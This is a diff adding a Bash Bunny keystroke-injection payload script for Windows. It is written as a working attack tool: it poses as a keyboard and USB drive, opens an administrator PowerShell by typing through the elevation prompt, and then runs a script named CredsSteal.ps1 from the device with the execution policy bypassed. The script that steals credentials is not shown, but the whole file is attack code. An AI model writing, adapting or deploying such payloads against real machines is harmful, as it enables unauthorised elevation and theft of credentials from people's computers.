@@ -1,0 +1,37 @@
+# Title: 
+# Author: 
+# Version: 1.0
+# Target: Windows
+#
+# 
+# Green .........Power On
+# White .........Started
+# White Blinking......... Running
+# Purple.................Finished
+################################################
+
+ATTACKMODE HID STORAGE 
+LED W
+LED W 200
+
+# start an admin powershell
+RUN WIN powershell.exe start powershell -verb runas
+Q ENTER
+Q DELAY 3000
+Q LEFTARROW
+Q ENTER
+Q DELAY 3000
+
+#PAYLOAD GOES HERE
+Q STRING \$bunny = Get-WmiObject Win32_Volume \| Where-Object { \$_.Label -eq \"BashBunny\" } \| Select-Object -ExpandProperty DriveLetter
+Q DELAY 500
+Q ENTER
+Q STRING cd \$bunny
+Q DELAY 500
+Q ENTER
+Q STRING powershell -ExecutionPolicy Bypass -File payloads\\${SWITCH_POSITION}\\CredsSteal.ps1
+Q DELAY 500
+Q ENTER
+
+
+LED M
